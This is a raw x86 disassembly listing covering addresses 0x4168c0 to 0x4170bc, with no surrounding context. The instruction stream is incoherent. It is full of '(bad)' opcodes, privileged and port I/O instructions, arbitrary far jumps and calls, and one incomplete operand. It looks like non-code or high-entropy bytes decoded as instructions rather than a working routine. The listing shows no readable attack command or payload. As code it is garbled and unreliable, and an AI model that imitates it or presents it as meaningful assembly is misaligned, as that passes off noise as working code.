  4168c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168c1:	pop    edx
  4168c2:	push   0xc999726d
  4168c7:	(bad)  
  4168c8:	leave  
  4168c9:	test   eax,0x808986a
  4168ce:	dec    edx
  4168cf:	adc    dh,BYTE PTR [eax+0x67]
  4168d2:	in     eax,dx
  4168d3:	loope  0x4168b7
  4168d5:	rol    ebx,0x2
  4168d8:	aas    
  4168d9:	sub    DWORD PTR ss:[eax],0x1f531555
  4168e0:	cmp    DWORD PTR [ebx+0x34],ecx
  4168e3:	fxch   st(0)
  4168e5:	daa    
  4168e6:	xchg   BYTE PTR [ebx+0x1b],bl
  4168e9:	packuswb mm5,QWORD PTR [edx]
  4168ec:	xchg   DWORD PTR [edx],ebp
  4168ee:	std    
  4168ef:	sub    DWORD PTR [ebx-0x82c3120],edi
  4168f5:	test   al,0x57
  4168f7:	cmc    
  4168f8:	int3   
  4168f9:	lea    ecx,[ebx+eiz*8-0x6a942c77]
  416900:	sub    dh,cl
  416902:	loopne 0x416904
  416904:	xor    al,0x56
  416906:	rcr    dh,0x7f
  416909:	mov    eax,ds:0xc5ba5a62
  41690e:	xchg   BYTE PTR [edi-0xd],dl
  416911:	jle    0x416895
  416913:	test   esp,0x83d348f0
  416919:	dec    edx
  41691a:	push   ebx
  41691b:	jecxz  0x4168f4
  41691d:	jl     0x41694c
  41691f:	adc    al,0x8
  416921:	xchg   esi,eax
  416922:	jae    0x41695e
  416924:	add    dl,ch
  416926:	fcomp  QWORD PTR [ebp-0x7a570e45]
  41692c:	iret   
  41692d:	xchg   BYTE PTR [ecx-0x55],dl
  416930:	or     edx,edx
  416932:	ficom  DWORD PTR [esi-0x7]
  416935:	xchg   ecx,eax
  416936:	mov    ch,cl
  416938:	xchg   BYTE PTR [ebp+0x6d],dh
  41693b:	fsubr  st(3),st
  41693d:	mov    ds:0xf0be2405,eax
  416942:	pop    esi
  416943:	inc    esi
  416944:	jno    0x416952
  416946:	sub    BYTE PTR [edx],ch
  416948:	dec    ebx
  416949:	inc    ecx
  41694a:	pop    ecx
  41694b:	sti    
  41694c:	or     ebp,DWORD PTR [ebx+ecx*2+0x6c]
  416950:	(bad)  
  416951:	mov    dh,0x27
  416953:	push   0x29639b06
  416958:	jge    0x416955
  41695a:	push   cs
  41695b:	xor    al,0xfc
  41695d:	adc    BYTE PTR [ebx-0x4d],dl
  416960:	sbb    eax,0xcea64451
  416965:	inc    DWORD PTR [eax-0x5cb08f47]
  41696b:	dec    ebx
  41696c:	jmp    0x34f0:0xd6578613
  416973:	dec    ecx
  416974:	int3   
  416975:	shl    DWORD PTR [edx+0xd2d3c8b],cl
  41697b:	nop    esi
  41697e:	push   ebx
  41697f:	(bad)  
  416980:	sub    bl,dh
  416982:	(bad)  
  416983:	xchg   ecx,eax
  416984:	jns    0x4169d2
  416986:	js     0x416924
  416988:	cmp    eax,0xbc505ae
  41698d:	sub    DWORD PTR [ebx-0x18],ecx
  416990:	pop    ds
  416991:	sub    al,0xf4
  416993:	sub    cl,bl
  416995:	imul   ecx,DWORD PTR [esi-0x12],0x31
  416999:	pop    esi
  41699a:	mov    gs,WORD PTR [ecx+0xd]
  41699d:	aad    0x84
  41699f:	(bad)  
  4169a0:	ror    BYTE PTR [esi],1
  4169a2:	jp     0x416973
  4169a4:	sar    al,cl
  4169a6:	push   esi
  4169a7:	adc    bh,dh
  4169a9:	fisttp QWORD PTR [edx]
  4169ab:	ss add al,0x8
  4169ae:	call   0xc1d8:0xd8d9f32a
  4169b5:	mov    ch,0x87
  4169b7:	inc    ebp
  4169b8:	int    0x43
  4169ba:	fsub   QWORD PTR [edi+edx*8]
  4169bd:	sub    al,0x28
  4169bf:	sub    BYTE PTR [ebx-0x855e7bc],dl
  4169c5:	and    ecx,esp
  4169c7:	add    al,0x62
  4169c9:	sti    
  4169ca:	or     dl,BYTE PTR [edx+edx*2]
  4169cd:	icebp  
  4169ce:	hlt    
  4169cf:	add    ch,0xa5
  4169d2:	loope  0x4169f8
  4169d4:	(bad)  
  4169d5:	out    dx,al
  4169d6:	popf   
  4169d7:	retf   
  4169d8:	out    0xb5,al
  4169da:	cwde   
  4169db:	mov    ecx,0xa824677e
  4169e0:	clc    
  4169e1:	icebp  
  4169e2:	sahf   
  4169e3:	xor    eax,0x4d628de8
  4169e8:	aad    0x3
  4169ea:	frstor [edi-0x42]
  4169ed:	cmp    cl,BYTE PTR [ecx-0x2ef1f65d]
  4169f3:	in     al,0x14
  4169f5:	and    bl,dl
  4169f7:	inc    ecx
  4169f8:	mov    bh,0xae
  4169fa:	add    DWORD PTR [ecx],ebp
  4169fc:	inc    ecx
  4169fd:	test   bl,ch
  4169ff:	addr16 or dh,al
  416a02:	xor    DWORD PTR [esi],esi
  416a04:	repnz mov DWORD PTR [edx],eax
  416a07:	mov    cl,0x3b
  416a09:	icebp  
  416a0a:	inc    edx
  416a0b:	add    eax,0xd28bf1f0
  416a10:	ja     0x416a2d
  416a12:	jmp    0xb76d:0x88ccd6e9
  416a19:	add    esp,DWORD PTR [ebx+0x10]
  416a1c:	std    
  416a1d:	icebp  
  416a1e:	adc    al,0x5b
  416a20:	pop    edi
  416a21:	into   
  416a22:	outs   dx,BYTE PTR ds:[esi]
  416a23:	adc    ecx,DWORD PTR [edx+0x2daf4e07]
  416a29:	ins    DWORD PTR es:[edi],dx
  416a2a:	xchg   DWORD PTR [ebx+0x5a],esp
  416a2d:	or     al,0xa7
  416a2f:	daa    
  416a30:	push   ecx
  416a31:	in     al,dx
  416a32:	mov    dh,0x28
  416a34:	test   edx,ebp
  416a36:	lods   al,BYTE PTR ds:[esi]
  416a37:	jne    0x416a48
  416a39:	test   BYTE PTR ds:0x9b6ca58e,al
  416a3f:	push   edx
  416a40:	sub    eax,0x49d831dd
  416a45:	aam    0x12
  416a47:	xor    eax,0x39aa2308
  416a4c:	pop    edx
  416a4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a4f:	xchg   edx,eax
  416a50:	cmp    eax,0x97a1875e
  416a55:	push   ecx
  416a56:	(bad)  
  416a57:	leave  
  416a58:	mov    eax,ds:0xad296645
  416a5d:	mov    ebp,0x6475cef5
  416a62:	mov    ds:0xf79dc9b3,eax
  416a67:	(bad)  [eax+0x39a38634]
  416a6d:	or     eax,0xee704d16
  416a72:	sub    al,0x49
  416a74:	jge    0x416aa6
  416a76:	lea    edx,[edx-0x9]
  416a79:	dec    edx
  416a7a:	sbb    DWORD PTR [edi+edi*2+0x31],ebx
  416a7e:	pop    eax
  416a7f:	sbb    ebp,esp
  416a81:	test   BYTE PTR [esi+0xaf18a07],0xfa
  416a88:	icebp  
  416a89:	imul   ebx,DWORD PTR [ebp-0x42],0x28e6e879
  416a90:	cmp    ah,BYTE PTR [eax-0x76]
  416a93:	mov    esi,0xecfc75f4
  416a98:	and    ebx,esi
  416a9a:	mov    DWORD PTR [edi],edi
  416a9c:	mov    DWORD PTR [esi],edx
  416a9e:	inc    eax
  416a9f:	fcom   QWORD PTR [ebx+0x31a37bc0]
  416aa5:	jmp    0xa0f09433
  416aaa:	les    ebp,FWORD PTR [ecx+ecx*1+0x48]
  416aae:	rol    BYTE PTR [edx+0x15f6466a],cl
  416ab4:	inc    esp
  416ab5:	div    DWORD PTR [edx+0x67]
  416ab8:	aam    0xe5
  416aba:	in     eax,dx
  416abb:	jb     0x416aa5
  416abd:	xchg   edi,eax
  416abe:	dec    edx
  416abf:	pop    eax
  416ac0:	jae    0x416b24
  416ac2:	jne    0x416a61
  416ac4:	daa    
  416ac5:	sub    eax,0x74f22dde
  416aca:	push   esi
  416acb:	ins    DWORD PTR es:[edi],dx
  416acc:	stos   BYTE PTR es:[edi],al
  416acd:	add    ebp,DWORD PTR [ecx]
  416acf:	call   0x28f4bcc3
  416ad4:	pop    edi
  416ad5:	pop    ecx
  416ad6:	jmp    DWORD PTR ds:0x7e201f7
  416adc:	xchg   ebp,eax
  416add:	fstp   TBYTE PTR [ebx-0x399fb0b2]
  416ae3:	cwde   
  416ae4:	or     BYTE PTR [eax-0x3c3071a5],bh
  416aea:	push   edi
  416aeb:	mov    ecx,DWORD PTR [ecx]
  416aed:	cmp    BYTE PTR [ebp+ecx*8-0x69cb60ad],0x50
  416af5:	test   DWORD PTR [esi-0x6f7af7ae],eax
  416afb:	(bad)  
  416afc:	jp     0x416b70
  416afe:	xor    BYTE PTR [esi],bl
  416b00:	test   DWORD PTR [ebp-0x25299bbe],0xf0426a50
  416b0a:	push   eax
  416b0b:	cdq    
  416b0c:	xchg   esp,eax
  416b0d:	scas   eax,DWORD PTR es:[edi]
  416b0e:	or     eax,0x4
  416b11:	(bad)  
  416b12:	pop    ebp
  416b13:	lods   eax,DWORD PTR ds:[esi]
  416b14:	cld    
  416b15:	mov    al,ds:0x4e631987
  416b1a:	scas   al,BYTE PTR es:[edi]
  416b1b:	and    esi,DWORD PTR [ebp-0x38]
  416b1e:	mov    gs,WORD PTR [eax]
  416b20:	(bad)  
  416b22:	call   0x243d739e
  416b27:	mov    edx,0xf21d4a7a
  416b2c:	fild   WORD PTR [esi+eiz*1-0xe918c8f]
  416b33:	pop    DWORD PTR [ebp-0x14]
  416b36:	xchg   BYTE PTR [ebp+0x73],dl
  416b39:	inc    edi
  416b3a:	jmp    0x416b8a
  416b3c:	mov    BYTE PTR [ebx-0x2af6b872],ah
  416b42:	lds    eax,FWORD PTR [esi-0x5e3b1656]
  416b48:	mov    fs,esp
  416b4a:	cmp    DWORD PTR [ebp+0x8],ecx
  416b4d:	mov    WORD PTR [ebx+0x16fb2c37],cs
  416b53:	pusha  
  416b54:	scas   eax,DWORD PTR es:[edi]
  416b55:	iret   
  416b56:	push   cs
  416b57:	adc    ecx,DWORD PTR cs:[ebp+edi*2+0x77]
  416b5c:	mov    edx,0x7a2921da
  416b61:	push   cs
  416b62:	dec    ecx
  416b63:	jmp    0x37c8b98f
  416b68:	(bad)  
  416b69:	stos   DWORD PTR es:[edi],eax
  416b6a:	addr16 xchg esi,eax
  416b6c:	fnstenv [ebp-0x7c48d769]
  416b72:	lahf   
  416b73:	sbb    edi,DWORD PTR [ecx-0x78]
  416b76:	cli    
  416b77:	fdivr  QWORD PTR ds:0x7988eaad
  416b7d:	cmp    BYTE PTR [eax-0x4bf2b58d],cl
  416b83:	push   DWORD PTR es:[edi-0x28]
  416b87:	xor    esp,DWORD PTR [ebx]
  416b89:	icebp  
  416b8a:	fcomp  DWORD PTR es:[esp+esi*2+0xe4dccd8]
  416b92:	push   0x36f119c2
  416b97:	and    ecx,DWORD PTR [eax+0x69]
  416b9a:	repnz sbb al,0x46
  416b9d:	icebp  
  416b9e:	adc    al,0x2e
  416ba0:	mov    ebp,0x80d3b006
  416ba5:	mov    al,0x94
  416ba7:	sub    al,0xcf
  416ba9:	jno    0x416b31
  416bab:	xchg   ebp,eax
  416bac:	repz xchg esp,eax
  416bae:	or     DWORD PTR [ebp-0x7b],0xffffffbc
  416bb2:	xlat   BYTE PTR ds:[ebx]
  416bb3:	sub    DWORD PTR [ebx+0x1c],edi
  416bb6:	pop    eax
  416bb7:	add    dl,BYTE PTR [edi]
  416bb9:	popf   
  416bba:	mov    ds:0x89e6c96e,eax
  416bbf:	jg     0x416c18
  416bc1:	inc    edx
  416bc2:	mov    DWORD PTR [ebp+0x28],esi
  416bc5:	icebp  
  416bc6:	fsub   DWORD PTR [eax+0x2f2dcd51]
  416bcc:	sbb    ch,BYTE PTR [ecx]
  416bce:	pop    ebx
  416bcf:	fld    QWORD PTR gs:[ebx]
  416bd2:	xchg   DWORD PTR [ecx-0x2a8b2b69],edx
  416bd8:	pop    ss
  416bd9:	xchg   BYTE PTR [ebx],cl
  416bdb:	xor    DWORD PTR [eax+0x29e12556],edi
  416be1:	add    eax,0x55e4e386
  416be6:	or     BYTE PTR ds:0x28faec23,bl
  416bec:	adc    BYTE PTR [ecx],cl
  416bee:	gs mov esi,0x84ccba09
  416bf4:	shl    DWORD PTR [ebx-0x4a],1
  416bf7:	mov    bh,0x3d
  416bf9:	out    0xe2,eax
  416bfb:	mov    BYTE PTR es:[edi],dh
  416bfe:	in     al,0x2d
  416c00:	aaa    
  416c01:	xchg   DWORD PTR gs:[esi],ecx
  416c04:	or     DWORD PTR [eax],ebx
  416c06:	mov    edi,ss
  416c08:	inc    edi
  416c09:	jmp    0x15da20ca
  416c0e:	aad    0x8
  416c10:	jo     0x416c03
  416c12:	pushf  
  416c13:	les    ebp,FWORD PTR [edi+eax*2+0xe]
  416c17:	repnz xor cl,ah
  416c1a:	dec    ecx
  416c1b:	add    bh,BYTE PTR [ebx-0x3e9e7c84]
  416c21:	xor    BYTE PTR [ebx+0x1e],ch
  416c24:	cmp    esi,eax
  416c26:	retf   0x7617
  416c29:	arpl   WORD PTR [ebp-0x10aca761],sp
  416c2f:	push   ss
  416c30:	gs or  eax,0x77c951d9
  416c36:	pop    edx
  416c37:	sub    BYTE PTR [eax+0x4f918201],ch
  416c3d:	mov    edi,0x7a3e7b87
  416c42:	xchg   esp,eax
  416c43:	dec    ecx
  416c44:	loope  0x416c16
  416c46:	int3   
  416c47:	sub    BYTE PTR [edi+edi*8+0x3808dee1],al
  416c4e:	out    dx,eax
  416c4f:	mov    dl,0xb4
  416c51:	jno    0x416cbe
  416c53:	cmp    DWORD PTR [ebp-0x33],ebx
  416c56:	cmp    al,0xe8
  416c58:	div    eax
  416c5a:	mov    edx,0x5b59026
  416c5f:	fmul   QWORD PTR [eax]
  416c61:	cs std 
  416c63:	and    esi,DWORD PTR [eax]
  416c65:	aad    0x67
  416c67:	pop    es
  416c68:	cmp    ecx,DWORD PTR [ecx-0x5df7da1e]
  416c6e:	mov    cl,0xe4
  416c70:	add    eax,0xf7148585
  416c75:	mov    ecx,DWORD PTR [eax+0x35]
  416c78:	imul   esp,DWORD PTR [esp+eiz*4-0x46],0xffffffd3
  416c7d:	lock cmp al,0x38
  416c80:	xor    edx,0xaf6bc1ed
  416c86:	mov    esi,0x87ea6e10
  416c8b:	mov    cl,0xac
  416c8d:	push   ecx
  416c8e:	dec    ebp
  416c8f:	jno    0x416c46
  416c91:	pop    ds
  416c92:	loop   0x416cab
  416c94:	xchg   edx,eax
  416c95:	xor    al,al
  416c97:	test   al,0x62
  416c99:	pusha  
  416c9a:	jb     0x416c9e
  416c9c:	dec    ecx
  416c9d:	lock cli 
  416c9f:	lds    edx,FWORD PTR [esi]
  416ca1:	push   edx
  416ca2:	fisttp WORD PTR fs:[edx-0x51119d10]
  416ca9:	mov    BYTE PTR [ebp-0x50],dl
  416cac:	and    eax,0xdb7292b7
  416cb1:	adc    DWORD PTR [esi+0x7b4b965f],eax
  416cb7:	sbb    eax,0x2876c181
  416cbc:	shr    DWORD PTR [ecx+ecx*8],1
  416cbf:	dec    ebx
  416cc0:	or     DWORD PTR [edx],esi
  416cc2:	rol    DWORD PTR [ecx+0x10cb1207],cl
  416cc8:	sti    
  416cc9:	neg    BYTE PTR [esi+ecx*8+0x66]
  416ccd:	mov    es,WORD PTR [ecx]
  416ccf:	mov    ds:0xe909af09,al
  416cd4:	enter  0x6704,0x1c
  416cd8:	ja     0x416c6b
  416cda:	fisub  DWORD PTR [esi+0x57]
  416cdd:	lds    ecx,FWORD PTR [esi]
  416cdf:	aas    
  416ce0:	or     dh,cl
  416ce2:	in     eax,dx
  416ce3:	fstp   TBYTE PTR [ecx-0x8]
  416ce6:	(bad)  
  416ce7:	mov    al,0x3
  416ce9:	dec    edi
  416cea:	test   bh,dh
  416cec:	lds    edx,FWORD PTR [ebx-0x933d331]
  416cf2:	xchg   cx,ax
  416cf4:	xchg   DWORD PTR [edi+0x37],eax
  416cf7:	add    al,0x78
  416cf9:	cmp    eax,0xf1f7e97e
  416cfe:	call   0xfe3e:0x34383867
  416d05:	iret   
  416d06:	push   esi
  416d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d08:	das    
  416d09:	icebp  
  416d0a:	ins    DWORD PTR es:[edi],dx
  416d0b:	(bad)  
  416d0c:	pop    esp
  416d0d:	push   ss
  416d0e:	pop    esp
  416d0f:	sub    DWORD PTR [esi],eax
  416d11:	cs inc esp
  416d13:	cmp    BYTE PTR ss:0x9b1b9b9f,0x7
  416d1b:	test   DWORD PTR [ebx],ebp
  416d1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d1e:	fwait
  416d1f:	sub    DWORD PTR [ecx+0x54],esi
  416d22:	pop    ebx
  416d23:	lods   eax,DWORD PTR ds:[esi]
  416d24:	test   edi,0xb58545f7
  416d2a:	xchg   BYTE PTR [esi+eiz*2-0x7edb5e50],dh
  416d31:	lock cs jbe 0x416da1
  416d35:	push   esi
  416d36:	sub    eax,0xeb34bb7b
  416d3b:	jmp    0x416d45
  416d3d:	mov    BYTE PTR [ebx-0x1c],bl
  416d40:	xchg   ebx,eax
  416d41:	stos   DWORD PTR es:[edi],eax
  416d42:	mov    ch,0xd3
  416d44:	stos   BYTE PTR es:[edi],al
  416d45:	icebp  
  416d46:	push   cs
  416d47:	popa   
  416d48:	loope  0x416ce8
  416d4a:	lods   eax,DWORD PTR ds:[esi]
  416d4b:	jb     0x416d10
  416d4d:	out    dx,eax
  416d4e:	out    dx,al
  416d4f:	les    edi,FWORD PTR [esi]
  416d51:	xor    al,0x86
  416d53:	out    0x77,eax
  416d55:	xchg   DWORD PTR [ebx+0x6e9017b7],esp
  416d5b:	jne    0x416d6c
  416d5d:	scas   al,BYTE PTR es:[edi]
  416d5e:	js     0x416d89
  416d60:	cs ds hlt 
  416d63:	repz or DWORD PTR [esi+edi*2+0x34bb489e],ecx
  416d6b:	out    dx,eax
  416d6c:	stc    
  416d6d:	lock jp 0x416cfe
  416d70:	in     eax,dx
  416d71:	es mov esp,0xd74d698b
  416d77:	dec    esp
  416d78:	(bad)
  416d7b:	jno    0x416d42
  416d7d:	jo     0x416da9
  416d7f:	dec    DWORD PTR [ebx]
  416d81:	idiv   DWORD PTR [ebx-0x5b7c36d7]
  416d87:	(bad)  
  416d88:	in     al,dx
  416d89:	ins    BYTE PTR es:[edi],dx
  416d8a:	nop
  416d8b:	pop    eax
  416d8c:	test   BYTE PTR [ecx],dh
  416d8e:	xchg   BYTE PTR [edi+0x2e44b743],ch
  416d94:	jnp    0x416d69
  416d96:	(bad)  
  416d97:	cs adc al,0xcb
  416d9a:	push   ecx
  416d9b:	xor    edi,DWORD PTR [eax-0x324bd9c8]
  416da1:	xchg   BYTE PTR [edi-0x16a3397d],al
  416da7:	pushf  
  416da8:	add    esi,DWORD PTR [ebx+0x577b28c0]
  416dae:	xlat   BYTE PTR ds:[ebx]
  416daf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416db0:	div    DWORD PTR [edi+0x4b]
  416db3:	sub    dl,BYTE PTR [ebx-0x45]
  416db6:	mov    edx,ebp
  416db8:	cmp    DWORD PTR ds:0x1e5d8ca9,ecx
  416dbe:	nop
  416dbf:	cmc    
  416dc0:	xor    eax,0x191128fa
  416dc5:	and    al,0xc2
  416dc7:	sub    BYTE PTR [ecx],ch
  416dc9:	xchg   edi,eax
  416dca:	cli    
  416dcb:	jmp    0xb39:0x787d448
  416dd2:	iret   
  416dd3:	es dec ebx
  416dd6:	inc    esp
  416dd7:	adc    DWORD PTR [ebx-0x357ab18],esi
  416ddd:	adc    esp,esi
  416ddf:	xor    al,0xa5
  416de1:	mov    DWORD PTR [esi+0x35981e21],0xb66ed9da
  416deb:	push   esp
  416dec:	add    esi,DWORD PTR [edi]
  416dee:	xchg   BYTE PTR [edx+esi*1-0xb],dl
  416df2:	jmp    0x416d8f
  416df4:	cwde   
  416df5:	xchg   DWORD PTR es:[ebp-0x1f66872e],edi
  416dfc:	loope  0x416e4b
  416dfe:	dec    eax
  416dff:	sub    DWORD PTR [esp+ecx*2],edi
  416e02:	add    ecx,DWORD PTR [esi+0x290432]
  416e08:	push   es
  416e09:	daa    
  416e0a:	retf   0x9b2
  416e0d:	into   
  416e0e:	(bad)  
  416e0f:	imul   DWORD PTR [ecx+0x1e3c4cf7]
  416e15:	pop    ss
  416e16:	les    ecx,FWORD PTR [edi]
  416e18:	ja     0x416dab
  416e1a:	and    edi,0x7516d1cb
  416e20:	or     BYTE PTR [esi+0x6ad71c56],ch
  416e26:	call   0xe842a530
  416e2b:	fdivr  DWORD PTR [ecx-0x3bd7f455]
  416e31:	or     ah,BYTE PTR [ecx]
  416e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e34:	psubd  mm3,QWORD PTR [esi]
  416e37:	mov    al,ds:0x26df9404
  416e3c:	bound  edi,QWORD PTR [eax+0x100f28b9]
  416e42:	in     al,dx
  416e43:	sub    dh,BYTE PTR [ecx]
  416e45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e46:	repz dec BYTE PTR [ebp+0x79]
  416e4a:	inc    ebp
  416e4b:	mov    dl,0x8
  416e4d:	push   ds
  416e4e:	leave  
  416e4f:	les    ebx,FWORD PTR [ecx+eiz*4-0xf94cf5b]
  416e56:	ins    BYTE PTR es:[edi],dx
  416e57:	xor    DWORD PTR [ebx],ebx
  416e59:	mov    BYTE PTR [esi],dl
  416e5b:	(bad)  
  416e5c:	and    cl,cl
  416e5e:	xlat   BYTE PTR ds:[ebx]
  416e5f:	xchg   edi,eax
  416e60:	js     0x416ecd
  416e62:	nop
  416e63:	jg     0x416e6f
  416e65:	lahf   
  416e66:	pop    eax
  416e67:	sub    BYTE PTR [edx-0xf],al
  416e6a:	mov    esp,?
  416e6c:	add    BYTE PTR [ebx+0xfc231d1],dh
  416e72:	add    DWORD PTR [edi],esp
  416e74:	or     BYTE PTR [edx],bh
  416e76:	push   0x260fd63d
  416e7b:	repz add DWORD PTR [eax],ebp
  416e7e:	pop    es
  416e7f:	retf   
  416e80:	out    dx,eax
  416e81:	mov    dh,bl
  416e83:	sub    DWORD PTR [esi],esp
  416e85:	pop    ebx
  416e86:	jo     0x416e7c
  416e88:	jl     0x416e7c
  416e8a:	add    dl,ah
  416e8c:	pop    ds
  416e8d:	pop    esp
  416e8e:	(bad)  
  416e8f:	sub    BYTE PTR [esp+ebp*2],bl
  416e92:	sbb    eax,0xf58ad77d
  416e97:	push   ecx
  416e98:	mov    edx,0xc697849e
  416e9d:	xor    DWORD PTR [edx],ebp
  416e9f:	dec    esp
  416ea0:	or     DWORD PTR [esi],ecx
  416ea2:	jae    0x416e55
  416ea4:	mov    ebx,0x21397f3
  416ea9:	icebp  
  416eaa:	add    al,0xbf
  416eac:	out    dx,eax
  416ead:	test   DWORD PTR [ebp+ebp*4-0x6e],0x6377feaf
  416eb5:	xor    BYTE PTR [esi+0x7b4104d],al
  416ebb:	xor    DWORD PTR [edi],ebx
  416ebd:	retf   
  416ebe:	sub    ah,ch
  416ec0:	xor    dh,al
  416ec2:	push   edi
  416ec3:	and    eax,0xb5381e7f
  416ec8:	or     BYTE PTR [eax],dh
  416eca:	imul   esi,DWORD PTR ds:0x926a616f,0xfffffffe
  416ed1:	icebp  
  416ed2:	fdivp  st(1),st
  416ed4:	ret    
  416ed5:	call   0xec9ccee0
  416eda:	push   eax
  416edb:	add    eax,0xe987e798
  416ee0:	xchg   ebx,eax
  416ee1:	cmp    bh,BYTE PTR [esi+ebp*4+0x28a68103]
  416ee8:	loop   0x416efe
  416eea:	leave  
  416eeb:	cld    
  416eec:	add    BYTE PTR [edx+edx*8+0x582df88b],dl
  416ef3:	stc    
  416ef4:	cld    
  416ef5:	das    
  416ef6:	jns    0x416f20
  416ef8:	or     BYTE PTR [eax-0x6a8e298f],ah
  416efe:	adc    eax,0xfcf109e2
  416f03:	test   al,0x25
  416f05:	iret   
  416f06:	sub    ah,BYTE PTR [ebx]
  416f08:	xchg   ebp,eax
  416f09:	shl    BYTE PTR ds:0xf8f09125,cl
  416f0f:	mov    DWORD PTR [edi-0x5c],ebx
  416f12:	adc    al,0x56
  416f14:	cmp    al,0xf2
  416f16:	loop   0x416f89
  416f18:	sti    
  416f19:	jo     0x416ef1
  416f1b:	jmp    0x416f62
  416f1d:	dec    eax
  416f1e:	sub    DWORD PTR [eax+ecx*1-0x134a617a],0xffffffdd
  416f26:	mov    ebp,0xfcf03d38
  416f2b:	shl    DWORD PTR [ecx],0xbe
  416f2e:	or     BYTE PTR [eax+0xd],bl
  416f31:	test   eax,0x8ca073c4
  416f36:	xchg   BYTE PTR [ecx],dl
  416f38:	adc    edx,DWORD PTR [edx+edi*4]
  416f3b:	pop    esi
  416f3c:	xchg   edi,eax
  416f3d:	sbb    eax,0x8abe29f5
  416f42:	jno    0x416f24
  416f44:	and    eax,0x1459b108
  416f49:	adc    dl,cl
  416f4b:	jg     0x416f1d
  416f4d:	mov    edi,esi
  416f4f:	push   0xdc3afbeb
  416f54:	rol    DWORD PTR [edi+0xf3d5b6e],cl
  416f5a:	mov    WORD PTR [eax-0x1e5d5e6],gs
  416f60:	jecxz  0x416f53
  416f62:	xchg   edx,eax
  416f63:	pop    ss
  416f64:	adc    al,BYTE PTR ds:0x3a97ed3c
  416f6a:	hlt    
  416f6b:	push   ebx
  416f6c:	cld    
  416f6d:	int    0x87
  416f6f:	ins    DWORD PTR es:[edi],dx
  416f70:	sub    eax,0x9cccf380
  416f75:	mov    BYTE PTR [esi-0x6de3c121],al
  416f7b:	jmp    0x28e99d6d
  416f80:	and    ecx,DWORD PTR [ebx]
  416f82:	test   BYTE PTR [eax-0x281775f7],bh
  416f88:	out    dx,eax
  416f89:	sub    eax,DWORD PTR ss:[edx]
  416f8c:	pop    ebp
  416f8d:	and    ebx,0xe7d6d6e4
  416f93:	imul   eax,DWORD PTR [ebx-0x32],0x69d529e6
  416f9a:	(bad)  
  416f9b:	cmp    eax,0xbe08320f
  416fa0:	lods   al,BYTE PTR ds:[esi]
  416fa1:	pop    ebp
  416fa2:	mul    DWORD PTR [edx-0x37903f55]
  416fa8:	and    eax,0xd429571a
  416fad:	loope  0x416f47
  416faf:	ret    
  416fb0:	or     esp,edi
  416fb2:	ja     0x416f63
  416fb4:	sub    eax,0x7d302c1f
  416fb9:	cmc    
  416fba:	fsub   DWORD PTR [ecx+0x4b62e315]
  416fc0:	retf   0xca61
  416fc3:	pusha  
  416fc4:	ins    DWORD PTR es:[edi],dx
  416fc5:	add    DWORD PTR [ebx-0x37],0x93865cf7
  416fcc:	into   
  416fcd:	sub    BYTE PTR [esi+0x6a],bl
  416fd0:	call   0xc77b:0xebd5aaef
  416fd7:	cmc    
  416fd8:	pop    ss
  416fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fda:	xchg   BYTE PTR [eax+0x7a9251f7],dl
  416fe0:	xor    DWORD PTR [esi],0xf152b330
  416fe6:	lock or ebx,ecx
  416fe9:	add    ah,BYTE PTR [esi+0x5a43c661]
  416fef:	ins    DWORD PTR es:[edi],dx
  416ff0:	adc    edi,eax
  416ff2:	and    BYTE PTR [ebp-0x6d],0x71
  416ff6:	sbb    BYTE PTR [ecx+0x1a88f125],dl
  416ffc:	cmp    esp,DWORD PTR ds:0x9b8b18d7
  417002:	mov    ebx,0x8763e8ff
  417007:	and    edi,DWORD PTR [eax]
  417009:	stos   DWORD PTR es:[edi],eax
  41700a:	xor    eax,0x82f97d83
  41700f:	sub    ch,bl
  417011:	mov    esi,0xac096a94
  417016:	dec    edx
  417017:	call   0x7b690f72
  41701c:	add    esi,esi
  41701e:	mov    WORD PTR [esi*8+0x286540b6],gs
  417025:	inc    edi
  417026:	jnp    0x417046
  417028:	push   ds
  417029:	push   ds
  41702a:	sbb    esp,0xffffffda
  41702d:	lock sbb dl,BYTE PTR [esi]
  417030:	cs jmp 0x28e6:0x58334e55
  417038:	pop    ecx
  417039:	mov    ecx,0x780810d3
  41703e:	adc    BYTE PTR [ecx+0x61aa4453],ch
  417044:	popa   
  417045:	mov    cs,WORD PTR [esi+0x2e]
  417048:	or     ebp,DWORD PTR [eax-0x7b576fa8]
  41704e:	pop    esi
  41704f:	adc    BYTE PTR [edi],ch
  417051:	jb     0x41708f
  417053:	icebp  
  417054:	dec    ax
  417056:	xchg   BYTE PTR [ebp-0x7f],bh
  417059:	jmp    0x417024
  41705b:	loopne 0x41706e
  41705d:	dec    eax
  41705e:	in     eax,dx
  41705f:	push   ecx
  417060:	inc    edx
  417061:	imul   eax,DWORD PTR [esi+0x2416c52e],0xfffffff3
  417068:	mov    ebp,0x54cb818e
  41706d:	and    dh,BYTE PTR [ebp-0x19]
  417070:	sar    bh,0x27
  417073:	rol    bh,1
  417075:	out    dx,eax
  417076:	inc    edx
  417077:	sub    dl,dh
  417079:	clc    
  41707a:	sub    eax,DWORD PTR ds:0x4d80b5f7
  417080:	aad    0x5e
  417082:	ds pop ebx
  417084:	sub    edi,edi
  417086:	mov    ss,ebx
  417088:	sbb    al,0xd1
  41708a:	cld    
  41708b:	xor    eax,DWORD PTR [ecx+0x79]
  41708e:	or     al,0x8
  417090:	mov    eax,0xfb6d0ab2
  417095:	jb     0x417116
  417097:	and    ecx,DWORD PTR [eax-0x6d20493]
  41709d:	icebp  
  41709e:	cwde   
  41709f:	jo     0x417091
  4170a1:	or     ah,BYTE PTR [ebx+0x9]
  4170a4:	(bad)  
  4170a6:	shl    bl,1
  4170a8:	cmp    BYTE PTR [ebp-0x79],dh
  4170ab:	jg     0x41706d
  4170ad:	jno    0x41703c
  4170af:	inc    esp
  4170b0:	sub    DWORD PTR [edx-0x2f54d7b7],ebp
  4170b6:	cld    
  4170b7:	add    BYTE PTR [eax],cl
  4170b9:	push   ds
  4170ba:	push   ds
  4170bb:	push   ecx
  4170bc:	popf   
